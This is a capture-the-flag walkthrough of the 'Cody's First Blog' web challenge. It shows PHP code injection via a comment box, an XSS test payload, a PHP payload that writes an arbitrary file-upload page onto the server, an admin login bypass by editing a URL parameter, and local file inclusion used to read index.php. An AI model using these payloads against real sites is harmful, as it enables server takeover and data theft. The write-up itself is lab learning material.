 CTF Walkthrough: Cody's First Blog (Web, Moderate)

 Introduction
Hey everyone! I'm Divyanshu Kumar, a cybersecurity enthusiast. In this post, I’ll walk you through my experience solving the Cody's First Blog CTF challenge. This is part of my series where I explore cybersecurity concepts through CTF (Capture The Flag) walkthroughs.

This challenge required a mix of web exploitation techniques like PHP payload execution, source code analysis, and local file inclusion (LFI). Let's break it down step by step!

---

 FLAG 0: PHP Code Injection via Comment Box

 Finding the Vulnerability
Initially, I attempted several different approaches without success. After analyzing the hints, I realized that the comment box was the key.

I started testing Cross-Site Scripting (XSS) payloads like:
```html
<img src=x onerror=alert("hacked")>
```
This confirmed that my comment was being stored and awaiting approval, which hinted at admin involvement.

Since the platform was PHP-based, I decided to try injecting PHP code. I submitted a comment containing PHP code, and once it was approved, my code executed, revealing the first flag!

```php
<?php echo 'FLAG0'; ?>
```

 Trick Disclaimer
I also used Burp Suite and utilized Intruder (Sniper attack) with multiple PHP payloads to obtain the flag without admin approval.

 Payload Used:
```php
$file = fopen ("upload2.php", "w"); echo fwrite($file, '<html><form action="upload2.php" method="post" enctype="multipart/form-data">Select image to upload; <input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></html><?php if( isset ($_POST["submit"])) { $file_name = $_FILES["fileToUpload"]["name"]; $file_tmp_name = $_FILES["fileToUpload"]["tmp_name"]; if (move_uploaded_file($file_tmp_name, "./" . $file_name)) { echo "ok"; } } ?>'); fclose($file);
```
Using this technique, I successfully bypassed admin approval and retrieved the flag directly.


![image](https://github.com/user-attachments/assets/7c96a5ac-7eec-4c93-b7a1-0a81d89de35d)


---

 FLAG 1: Admin Authentication Bypass

 Finding the Vulnerability
To progress, I examined the source code of the index page and discovered a hidden comment:
```html
<!--<a href="?page=admin.auth.inc">Admin login</a>-->
```
This suggested the presence of an admin authentication page.

 Exploitation
Navigating to `?page=admin.auth.inc`, I reached an admin login page. I attempted various default credentials without success. Using GoBuster, I enumerated directories and found:
```
/.hta (403)
/.htaccess (403)
/.htpasswd (403)
/index.php (200)
/php.ini (200)
/posts (301)
/server-status (403)
```

Although accessing `php.ini` was possible, it didn’t reveal anything useful. At this point, I noticed the admin page URL structure:
```
?page=admin.auth.inc
```
Since authentication is usually enforced here, I tested removing 'auth' from the filename:
```
?page=admin.inc
```
And just like that—I was logged in as admin! and at the end of page got the flag

Now, I had the power to approve comments, which meant I could approve my previous PHP code injection and use it in the next step.


![Screenshot 2025-03-07 153901](https://github.com/user-attachments/assets/9208dc7f-9136-4e72-b8fa-bb6a93181389)


---

 FLAG 2: Executing Approved PHP Code via LFI

 Finding the Vulnerability
At this stage, we knew:
✅ We could submit PHP code as a comment.
✅ We could approve it as an admin.
✅ The server had local file inclusion (LFI) enabled.

Since the server couldn’t communicate externally, I had to execute my code locally.

 Exploitation
By visiting:
```
?page=http://localhost/index
```
I observed that previously approved PHP comments were executed. This meant I could inject a command to read `index.php` and extract the final flag.

 Proof of Concept
I submitted a comment containing:
```php
<?php echo file_get_contents('index.php'); ?>
```
After approving the comment and navigating to `localhost/index`, I checked the developer tools (F12) and saw that my PHP code had executed successfully, revealing FLAG2.



![Screenshot 2025-03-07 174325](https://github.com/user-attachments/assets/9697dd68-16b2-4a7d-bdf9-1e12a4783ccf)

---

 Conclusion
This challenge reinforced key web exploitation concepts:
✅ PHP code injection via comment boxes.
✅ Authentication bypass by manipulating URL structures.
✅ Executing arbitrary code through LFI.

CTF challenges like this are a great way to develop real-world security skills. Stay tuned for more walkthroughs, and let me know if you have any insights or questions!

Happy hacking! 🔥

